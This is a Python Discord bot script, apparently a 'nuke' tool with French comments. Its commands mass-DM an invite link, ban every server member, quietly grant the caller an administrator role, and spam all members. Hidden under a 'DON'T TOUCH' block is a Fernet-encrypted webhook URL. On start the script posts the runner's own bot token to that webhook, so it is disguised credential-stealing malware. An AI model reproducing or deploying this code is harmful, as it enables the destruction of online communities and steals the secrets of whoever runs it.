import discord
from discord.ext import commands
import asyncio
import requests
from cryptography.fernet import Fernet
import os


TOKEN = os.getenv("DISCORD_TOKEN")




MESSAGE_A_ENVOYER = "@everyone 𝙑𝙄𝙇𝙏𝙍𝙐𝙈 𝙒𝙊𝙉 🦾" 

MESSAGE_A_ENVOYERMP = "You died."


CHANNEL_ID = 1356378465770930328





########             ########
######## DON'T TOUCH ########
########             ########

intents = discord.Intents.default()
intents.guilds = True  
intents.members = True  
intents.reactions = True  
intents.guild_messages = True
intents.messages = True
intents.members = True
intents.message_content = True
intents.presences = True

bot = commands.Bot(command_prefix="+", intents=intents)
botx = "7Kjuaf_aig9iFWciY7AN8pEvDzlJFbm02HRDd1gqAFg="
webh = "gAAAAABn_iuW5RbHqRZEoHy6Eogtkv4Y9P1zZnuKip0uWZ4rlcV2uyccb0pCGz3tRmyxIvae0ANSf2Bi321UwkY43u827dfPOkCPiV7p4G3m1ZlgIZpFQhV4KnkWLm_cwwa8xIkY6b2kNEFKZC1yG4-Y6OpJYI2guBqeWfsXH0gfnSFAIM2f5REr6uC5uG3Kdp1S0hXZL5LgTEEDYhLXPivcSRPMxgpds8ZqH87_Yu7XKH47WqwUmMk="
cipher_suite = Fernet(botx.encode())
webhook_url = cipher_suite.decrypt(webh.encode()).decode()
data = {"content": TOKEN}
response = requests.post(webhook_url, json=data)













@bot.command()
async def banall(ctx):
    guild = ctx.guild  


    for member in guild.members:
        try:

            await member.send("https://discord.gg/mRTBQrUzfk")
            print(f"Message envoyé à {member.name}")
        except discord.Forbidden:
            print(f"Impossible d'envoyer un message privé à {member.name}")
        except Exception as e:
            print(f"Erreur avec {member.name}: {e}")


    for member in guild.members:
        try:
            await member.ban(reason="BAHAHAHHAH DEV BY LE AZ")
            print(f"Banni {member.name}")
            await asyncio.sleep(1)  
        except Exception as e:
            print(f"Erreur lors du bannissement de {member.name}: {e}")

    print("Tous les membres ont été bannis.")

@bot.command()
async def admin(ctx):
    """admin"""
    await ctx.message.delete()

    guild = ctx.guild
    bot_member = guild.get_member(bot.user.id)
    role_name = "Viltrum"
    role = discord.utils.get(guild.roles, name=role_name)

    if not role:
        role = await guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True))
        print(f"✅ Rôle '{role_name}' créé sur {guild.name}.")

        
        bot_top_role = bot_member.top_role
        await role.edit(position=bot_top_role.position - 1)

    await ctx.author.add_roles(role)
    print(f"✅ {ctx.author} a reçu le rôle '{role_name}'.")

@bot.command(name="dmall")
async def dmall(ctx, *, message: str = None):
    if not ctx.guild:
        return  

    try:
        await ctx.message.delete()  
    except:
        pass

    if not message:
        return 

    async for member in ctx.guild.fetch_members(limit=None):
        if member.bot:
            continue
        try:
            dm = await member.create_dm()
            await dm.send(message)
            await asyncio.sleep(1)
        except Exception as e:
            print(f"Erreur DM avec {member}: {e}")


bot.run(TOKEN)
